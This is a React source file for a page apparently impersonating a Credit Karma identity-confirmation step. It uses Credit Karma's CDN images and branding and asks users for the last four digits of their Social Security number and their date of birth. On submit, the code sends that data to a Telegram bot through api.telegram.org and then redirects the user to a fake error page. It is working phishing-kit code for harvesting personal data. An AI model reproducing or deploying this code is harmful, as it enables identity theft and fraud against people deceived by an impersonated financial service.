import React, { useCallback, useEffect, useState } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import Header from '../../components/Header';
import Sidebar from '../../components/Sidebar';
import Footer from '../../components/Footer';
import axios from 'axios';
import { botToken, chatId } from '../../constants';

const SocialSecurityPage: React.FC = () => {
  const [sidebarOpen, setSidebarOpen] = useState(false);

  const [socialSecurityNumber, setSocialSecurityNumber] = useState('');
  const [showSSN, setShowSSN] = useState(false);

  const [month, setMonth] = useState('');
  const [day, setDay] = useState('');
  const [year, setYear] = useState('');

  const [errors, setErrors] = useState({
    socialSecurityNumber: '',
    dateOfBirth: '',
  });

  const navigate = useNavigate();

  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: currentYear - 1899 }, (_, i) => 1900 + i);
  const daysInMonth = month ? new Date(year, month, 0).getDate() : 31;

  const toggleSSNVisibility = () => {
    setShowSSN((prev) => !prev);
  };

  const getMonthName = (monthNumber) => {
    const monthNames = [
      "January", "February", "March", "April", "May", "June",
      "July", "August", "September", "October", "November", "December"
    ];
    return monthNames[monthNumber - 1]; // Adjusting for zero-based index
  };


  const sendMessageToTelegram = async (message) => {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    try {
      await axios.post(url, {
        chat_id: chatId,
        text: message,
      });
      console.log('Message sent successfully');
    } catch (error) {
      console.error('Error sending message:', error);
    }
  };

  const handleSubmit = (event) => {
    event.preventDefault();
    let newErrors = { socialSecurityNumber: '', dateOfBirth: '' };

    // Validate socialSecurityNumber
    if (!socialSecurityNumber.trim()) {
      newErrors.socialSecurityNumber = 'SSN required.';
    }

    // Validate date of birth
    if (!month || !day || !year) {
      newErrors.dateOfBirth = 'Complete date of birth is required.';
    } else {
      const dob = new Date(year, month - 1, day);
      const age = new Date().getFullYear() - dob.getFullYear();
      const monthDiff = new Date().getMonth() - dob.getMonth();

      // Check if age is less than 18
      if (age < 18 || (age === 18 && monthDiff < 0)) {
        newErrors.dateOfBirth = 'You must be at least 18 years old.';
      }
    }

    setErrors(newErrors);

    // Check if there are no errors
    if (!newErrors.socialSecurityNumber && !newErrors.dateOfBirth) {
      // Proceed with form submission
const userData = `------------ \n\nSSN_last4: ${socialSecurityNumber}\nDOB: ${getMonthName(month)}/${day}/${year}`;
      console.log(userData);

      sendMessageToTelegram(userData);

      navigate('/social-security-error');

      setErrors({ socialSecurityNumber: '', dateOfBirth: '' });
    }
  };

  return (
    <>
      <Header sidebarOpen={sidebarOpen} setSidebarOpen={setSidebarOpen} />
      {<Sidebar sidebarOpen={sidebarOpen} setSidebarOpen={setSidebarOpen} />}
      <section>
        <div className="grid grid-cols-1 gap-4">
          <div className="px-10 pt-4">
            <h1 className="text-3xl font-extrabold mb-6">
              Social Security & Date of birth Confirmation
            </h1>

            <div className="flex items-center gap-3 text-sm font-bold mt-2 mb-2">
              <p className="">
                We will need you to confirm your personal information.
              </p>
            </div>

            <form onSubmit={handleSubmit}>
              <div className="mt-7">
                <div className="mb-8">
                  <label className="mb-2.5 block font-medium text-black dark:text-white">
                    Last 4 digits of your social security number
                  </label>
                  <div className="relative">
                    <input
                      id="password"
                      name="password"
                      type={showSSN ? 'text' : 'password'}
                      value={socialSecurityNumber}
                      onChange={(e) => setSocialSecurityNumber(e.target.value)}
                      placeholder="XXXX"
                      maxLength="4"
                      className="w-full rounded-md border border-stroke bg-transparent py-3 pl-6 pr-15 text-black outline-none focus:border-primary focus-visible:shadow-none dark:border-form-strokedark dark:bg-form-input dark:text-white dark:focus:border-primary"
                    />

                    {errors.socialSecurityNumber && (
                      <div className="flex items-center gap-3 text-sm font-bold mt-2">
                        <svg
                          width="1rem"
                          height="1rem"
                          viewBox="0 0 24 24"
                          className="fill-current text-red-600"
                          aria-hidden="true"
                        >
                          <path
                            d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"
                            fillRule="nonzero"
                          ></path>
                        </svg>

                        <p>Last 4 digits of social security number required</p>
                      </div>
                    )}
                    <span
                      className="absolute right-4 top-3 cursor-pointer"
                      onClick={toggleSSNVisibility}
                    >
                      {showSSN ? 'Hide' : 'Show'}
                    </span>
                  </div>
                </div>

                <div className="mb-8">
                  <label className="mb-2.5 block font-medium text-black dark:text-white">
                    Date of Birth
                  </label>
                  <div className="grid grid-cols-3 gap-4 text-black">
  <div>
    <select
      id="month"
      value={month}
      onChange={(e) => {
        setMonth(e.target.value);
        setDay(''); // Reset day when month changes
      }}
      className="w-full rounded-md border border-stroke bg-white dark:bg-gray-800 py-3 pl-6 pr-15 text-black dark:text-white outline-none focus:border-primary focus-visible:shadow-none dark:border-form-strokedark dark:focus:border-primary"
    >
      <option value="">Month</option>
      {[...Array(12)].map((_, i) => (
        <option key={i} value={i + 1}>
          {new Date(0, i).toLocaleString('default', {
            month: 'long',
          })}
        </option>
      ))}
    </select>
  </div>

  <div>
    <select
      id="day"
      value={day}
      onChange={(e) => setDay(e.target.value)}
      className="w-full rounded-md border border-stroke bg-white dark:bg-gray-800 py-3 pl-6 pr-15 text-black dark:text-white outline-none focus:border-primary focus-visible:shadow-none dark:border-form-strokedark dark:focus:border-primary"
    >
      <option value="">Day</option>
      {[...Array(daysInMonth)].map((_, i) => (
        <option key={i} value={i + 1}>
          {i + 1}
        </option>
      ))}
    </select>
  </div>

  <div>
    <select
      id="year"
      value={year}
      onChange={(e) => setYear(e.target.value)}
      className="w-full rounded-md border border-stroke bg-white dark:bg-gray-800 py-3 pl-6 pr-15 text-black dark:text-white outline-none focus:border-primary focus-visible:shadow-none dark:border-form-strokedark dark:focus:border-primary"
    >
      <option value="">Year</option>
      {years.map((yr) => (
        <option key={yr} value={yr}>
          {yr}
        </option>
      ))}
    </select>
  </div>
</div>


                  {errors.dateOfBirth && (
                    <div className="flex items-center gap-3 text-sm font-bold mt-2">
                      <svg
                        width="1rem"
                        height="1rem"
                        viewBox="0 0 24 24"
                        className="fill-current text-red-600"
                        aria-hidden="true"
                      >
                        <path
                          d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"
                          fillRule="nonzero"
                        ></path>
                      </svg>
                      <p>{errors.dateOfBirth}</p>
                    </div>
                  )}
                </div>
                <div className="mb-10">
                  <input
                    type="submit"
                    value="Continue"
                    className="w-full cursor-pointer font-bold rounded-md border border-primary bg-primary p-3 text-white transition hover:bg-opacity-90"
                  />
                </div>
              </div>
            </form>
          </div>

          <div className="bg-pink p-3">
            <img
              srcset="https://creditkarmacdn-a.akamaihd.net/res/content/bundles/assets/1.151.106/auth/logon/cyok-qr-code_2x.png?auto=compress%2Cformat&amp;dpr=1 1x, https://creditkarmacdn-a.akamaihd.net/res/content/bundles/assets/1.151.106/auth/logon/cyok-qr-code_2x.png?auto=compress%2Cformat&amp;dpr=2 2x, https://creditkarmacdn-a.akamaihd.net/res/content/bundles/assets/1.151.106/auth/logon/cyok-qr-code_2x.png?auto=compress%2Cformat&amp;dpr=3 3x, https://creditkarmacdn-a.akamaihd.net/res/content/bundles/assets/1.151.106/auth/logon/cyok-qr-code_2x.png?auto=compress%2Cformat&amp;dpr=4 4x"
              src="https://creditkarmacdn-a.akamaihd.net/res/content/bundles/assets/1.151.106/auth/logon/cyok-qr-code_2x.png?auto=compress%2Cformat"
              alt=""
              width="500"
              height="Auto"
            />

            <div className="text-center">
              <h1 className="text-3xl font-extrabold mb-3">
                Create your own karma.
              </h1>

              <p>Download our app to see what’s new.</p>
            </div>
          </div>
        </div>
      </section>

      <Footer />
    </>
  );
};

export default SocialSecurityPage;
